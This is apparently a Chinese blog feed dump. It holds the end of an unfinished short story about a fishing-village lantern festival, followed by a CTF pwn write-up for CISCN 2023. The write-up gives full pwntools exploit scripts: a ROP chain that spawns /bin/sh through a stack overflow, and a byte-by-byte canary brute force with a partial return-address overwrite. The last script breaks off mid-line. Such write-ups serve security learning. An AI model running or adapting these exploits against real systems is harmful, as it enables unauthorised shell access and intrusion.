title="2"></a>2</h2><p>荣氏茶楼对面的广场上，晚会正在紧锣密鼓地布置。在迷宫般复杂的木质结构中，近百名工人如工蚁般穿梭其间——全村近八成的壮年劳动力都在这里了。这些仍穿着捕鱼衣着的工人，本不愿暂歇一天的生计来赚取这微乎其微的工费。奈何晚会项目的主导者，正是掌管当地渔船、渔具一切事宜的渔户巨头——荣兴波。</p><p>此时荣兴波正在自家茶楼上和艾明才喝茶。 十年前的春天，艾明才走马上任村长。彼时荣兴波年方二十，正是心高气傲的年纪，所以对这个年长自己几岁而始终在父亲面前毕恭毕敬的异乡人并没有好感。 一天，艾明才照常到茶楼找父亲聊天，撞见了正在临摹字帖的荣兴波。端详良久，艾明才对父亲说：“荣先生，以令郎的才干，埋没在这等小地方实在可惜。我听闻北京、上海有不少新兴的学校，若能送去深造几年，增长见闻，发展人脉，对令郎日后发展必然大有裨益。”艾明才的谏言令父亲少见地陷入沉思，连荣兴波也不得不承认自己从此对他另眼相看。 此后荣兴波投身大城市，一年到头只给家里写一封信。信的内容无非是城里的新鲜事和对至亲的慰问，至于自己过的如何，他从来都一笔带过。直到四年前，父亲病死。</p><p>父亲的死是艾明才写信告诉他的。他花了火车归程的三个昼夜，始终也没明白记忆里那么倔强的父亲，怎么在命运的呵令前如此温顺。 回乡后，村里的路面已经翻修一新，渔港方向传来的汽笛声浑厚有力，新建的广场、舞厅、电影院更让荣兴波有种仍未离开大城市的错觉。经过艾明才几年间大刀阔斧的改革，一场崭新时代的风暴正在渔村的上空蓄势待发。对村长的敬意暂时抑制住了他原先的悲哀。 但他最终还是无可逃避地走向了那个记忆中的家。</p><p>多年后，他再也回忆不起这段路上的任何细节，好像这一程是别人替他走完的。但进门之后一切都变得清晰起来。他看见吊唁者送来的礼物随意地铺倒在院子里。这画面使他联想起遥远的五岁生日。那天父亲头回有空带他去海滩玩耍。当时潮水刚匆忙退去，无力奔走的贝类和海星成了海洋的弃子。它们也是以同样的姿态散乱地躺平在沙滩的边缘，如同来自另一个世界的礼物——这是人类的说法。对这些注定消逝的生灵来说，被日光抽干剩余的生命算得上最为体面的死法了。“大海，你带我走吧！”它们假如有声带，是否会发出这样的呐喊？荣兴波曾这样想过。现在他也有不顾一切呐喊的冲动，可声带却不知被什么东西扼住了。 从房门到灵堂，他总共走了四十二步，每一步都让他的身体矮下去一截。起初他必须强忍泪水，才能在两侧看客同情的目光中保持体面，但走到最后一步时，他的身形已经佝偻，眼中的水却凝成了冰。通透的冰，锋利的冰。</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>吴致知是在今天上午接到的口信。</p><p>与其说是接到，不如说是等到。自从吴致知拒绝参加灯会的消息传开，每年这天中午，荣兴波都会在茶楼宴请他，称是叙旧，但每次艾村长的到场显然使这番言辞的说服力大打折扣。 锁上书斋的大门，踏经酒馆门口的落叶，再绕过广场上纵横交错的支架，吴致知终于在约定时间的前一刻站在了“荣氏茶楼”蓝底金字的牌匾前。 牌匾上挂着一个人，正攥着毛笔往早已褪色的“荣”字上抹金色。油漆李去年就已退休搬走，眼前这个笨手笨脚的小伙子估计只是个临危受命的学徒。吴致知清楚，因为最初防潮处理不当，如今的牌匾被腐蚀得几乎只剩空壳。他担心小伙子稍一用力，那个草字头就会应声落下。 “等它掉下来，我再进门。”吴致知盘算着。 这时，头顶传来一声不详的惊呼，随后是“啪嗒”的坠落声。 “草！”头顶的声音说。他扭头向下望，所幸门口空无一人。</p><p>门帘内外是两个世界。轻盈的烟雾从每张茶桌的角落升起，于是每个人的上半张脸就在这白雾中时隐时现，唯一能看清的是他们的嘴：不时吞云吐雾以显处变不惊的嘴，高音喇叭般谈天论地的嘴，随着气氛递进机敏地挤出笑颜或愁容的嘴……吴致知常常希望自己能详实记载下这里的每一张嘴，但令他苦恼的是，每当他试图接近观察，观察对象就忘记了自己的特点，而客气得千篇一律了。</p><p>“哎吴老师，您总算来啦，” 满面春风的王掌柜从楼梯上小步跑来，“艾村长、荣大老板都在楼上雅间等着您呢。”他一面给来客带路，一面夸耀着今天的饭菜：“这次的黑鲔鱼是昨天刚捕来的，那大家伙，四个小伙才抬得动！就冲这宝贵的食材，我这把老骨头今天亲自下厨，拿出了咱祖传的十八道工序……哎，这边请……荣大老板！吴老师来啦！”宽大的八仙桌旁，对坐着艾、荣两人，见到来客立即停下了刚才的话题，笑容满面地站了起来。 “吴先生，欢迎欢迎。请落座。”艾明才把拥挤的菜盘堆叠成一个危险的小塔，为吴致知留出足够空间。</p><p>“劳烦您了，艾村长。”吴致知说着坐了下来，二位也跟着坐下。 “一些家常菜，请吴先生不要介意。”荣兴波这么说着，语气中却有着几分得意。这种规格的筵席，村里办得起的人家屈指可数。吴致知会心地笑了笑，顺势开始谈起每道菜的历史、原料、工艺。他每讲一道，荣兴波就赞同地点点头。 “吴先生学识渊博、见解独到，村里能有您这样的老师，实在是孩子们的幸福。这样，吴先生！我敬你！”艾村长突然双手捧杯，凑向吴致知。吴致知盛情难却，喝下半杯白酒。 “小荣啊，这么多年，咱们也算是老朋友了。”敬罢吴老师，艾村长添满酒，转向荣兴波。荣兴波急忙举起酒杯。“每次看到你，我就想起你的父亲，还有我们一起走过的路。可惜斯人已逝，那些岁月再也回不去了。”艾明才的眼中似乎有东西在闪烁，“如今你一人扛起荣家的大梁，也为村子做了不少贡献。有你这个得力的合作伙伴，实在是我艾某人的幸运。如果荣老能看到现在的你，他该有多欣慰啊！” 荣兴波露出惭愧的笑：“艾叔，您太客气。没有您的指导，我无论如何也走不到今天。” 酒杯相碰，几点晶莹的浪花落在鱼头上。 “哈哈哈！那，祝咱们日后合作愉快！” “合作愉快。” “干！” 又是一声清脆的碰撞，干净利落。</p><p>几番推杯换盏后，荣兴波已经面露醉意，放下筷子与艾明才海阔天空地漫谈。吴致知正在咀嚼一颗切成芙蓉模样的西兰花。那些同样被咀嚼过千遍的筵席上的表演，大概也是这样的干涩无味。是那些愿意为精致形状买单的人，让这些菜品经久不衰地根踞于此。直到它们被冠以“传统”之名后，即使是最挑剔的食客也要扮出饕餮的神情扒拉几口。 “吴先生，”荣兴波突然打断了他漫无边际的幻想，“您是最懂教育的。我最近遇到一个这方面的问题，想向您请教。” 吴致知呷了一口茶。一些苦荞钻进他的嘴，他一并咽了下去。 “最近的年轻人之间开始萌芽一种风气。他们刚接触到新潮流的浪尖，就开始摈斥那些扎根海底几百年的文化。在他们还没能够领悟这些传统的年纪，就已经开始在它们和自己之间筑起决绝的堤坝。就这么说吧——”荣兴波停顿了一下，“就连近两年的灯会，也有一些年轻人拒绝参加了。” “灯会是我们村从诞生起就流传至今的亘古不变的习俗，更是我们村发展文化旅游产业道路上至关重要的一环。若长久以往，灯会的参与程度越来越低，外界对这个项目的期望也会降低……往现实点说，对本村的投资会相应减少。 “当我向孩子们讲明这些道理时，他们却表现得不以为然，甚至，有人还摆出您的例子来反驳……”荣兴波的声音低了下去，但每个字都咬得相当清晰。 像是乐章弹到了终止符，声音从此刻的房间里蒸发了。艾明才凝视着荣兴波，荣兴波凝视着吴致知，吴致知凝视着八仙桌中心的黑鲔鱼头，鱼头凝视着天花板上的新式电灯，电灯的光线颤颤巍巍的，看不清三人一鱼的脸上各自藏了什么表情。 “啪”，艾明才手中两根筷子率先打破了沉默：“说什么呢，小荣。咱们今天好不容易聚一聚，就别谈伤感情的事了。来，大家吃菜，吃菜。”他说着夹起一只大虾，一边露出赔罪的笑，一边往吴致知盘子里送。 吴致知不言，没有拒绝。 “吴先生不来，自然有他的道理，个中缘由，咱们也不便深究，”艾明才重新坐端正，又关切地看向吴致知，“但吴先生如果有什么心结，或是遇到什么问题，我等愿全力以赴助您解决……如果您不嫌弃的话。”对面的荣兴波也点头表示赞同。 “承蒙大家关心，鄙人实在没有别的原因，只是近年身体每况愈下，需要静养，禁受不起这样热闹的场面。” “哈哈，坊间有传闻说您在某个灯会的夜晚撞了邪，此后就不再出席晚会了。现在的流言真是耸人听闻。”荣兴波仿佛在聊起一个滑稽而拙劣的故事，目光却有意无意地刺向吴致知。 那个眼神，吴致知上一次见到，正是在那个有着传说色彩的夜晚。那时他只是向寺院后屋的窗里一瞥，遇上的是同样的眼神，同一张面孔。烛火中通红的脸迎上月光下惨白的脸，他们几乎在瞬间就认出了对方。白脸仓皇而逃，红脸和他的伙伴们似乎在叫嚷着什么，但寺院很快就重归宁静。白脸钻进百米外的杨树林里，头顶的月亮仍是不言地挂着，很难说是这场闹剧中谁的同谋。</p><p>这一次对视，吴致知没有闪躲，而是以锐利百倍的目光回敬。 但预料中的对峙没有出现，包间外的一阵骚动暂时推迟了这一时刻的来临。 “王掌柜，发生什么事了。”艾明才喊道。 “一个鱼人，啊哈哈，也不算，小丑罢了。”王掌柜的声音从喧哗的门外传来。 但吴致知立刻拉开门冲了出去。他以一种难以置信的灵活挤进人群的中心，来到二楼临街的围栏边，顺着几百颗伸长的脑袋，望向所有视线的焦点。 在吴致知真真切切地看到这一幕之前，它早就像一个未卜先知的梦魇，在每一个不安的夜蚕食着他的理智，强迫他逐渐勾勒出这幅画面的细节。此时眼前的现实不过是梦魇的印证，他却还是感到一阵眩晕： 街道的中心站着一个男人。他戴着绿色的鱼人头套，在人群灼热的目光下滑稽地舞动自己干瘪的身体。与这条街格格不入的头套，在那一夜的寺院后屋里，同样那么格格不入。</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>他在戴上头套的那一刻后悔了。 潮湿和温热包裹了这个隔绝一切的世界。呼吸撞在柔软的内壁上，会变成一种腐烂的气味反弹回来，像是来自咫尺之外的另一个生物。这荒谬的幻觉让他感到好笑，但他立刻惊恐地意识到，若果真如此，他并不能从感觉上分辨出两者的差异。这让他产生了不顾一切拽下头套的冲动。 头套没有反抗，顺从地被扔在桌上，只是双眼依旧空洞地望着他。 黑夜、黑洞、深海，黑色的事物往往给人辽阔的想象空间。此时望着一对漆黑的眼眸，他回想起的是芦苇地里那段简短的梦幻。夜色中女孩看起来至多十五六岁，手法却相当娴熟，这使他更加确信自己触摸到的不过是爱情免费的碎片。于是他抽身要走。女孩对他说：“你一定会再来。”后来他果然在一连几个月的夜晚如期而至。女孩说：“你在决定踏进这片芦苇地时，就已经决定了之后的一切。”他觉得女孩像个先知。先知是可以不期而别的。 现在女孩又出现在头套的眼眸中，以依然笃定的神情预见着他接下来的举动。</p><blockquote><p>半成品也好意思挂</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> literature </category>
          
      </categories>
      
      
        <tags>
            
            <tag> literature </tag>
            
            <tag> fiction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2023pwn宝宝题解</title>
      <link href="/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/"/>
      <url>/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>坐牢了，只会做baby题</p></blockquote><h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>整型下溢，然后有个栈溢出，直接用ROPgadget生成ropchain</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.56.251.120&quot;</span></span><br><span class="line">port = <span class="number">36293</span></span><br><span class="line"><span class="comment">#pl = process(&quot;./shaokao&quot;)</span></span><br><span class="line">pl = remote(host,  port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;-1145144&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure><h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>fork子进程崩溃不改变canary,利用该性质逐字节爆破canary,发现后门函数，直接覆盖前两位地址，第三位直接猜</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.57.248.214&quot;</span></span><br><span class="line">port = <span class="number">25775</span></span><br><span class="line"><span class="comment">#pt = process(&quot;./funcanary&quot;)</span></span><br><span class="line">pt = remote(host, port)</span><br><span class="line"></span><br><span class="line">pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)</span><br><span class="line">        pt.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line"></span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x02&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x12&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x22&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x32&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x42&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span 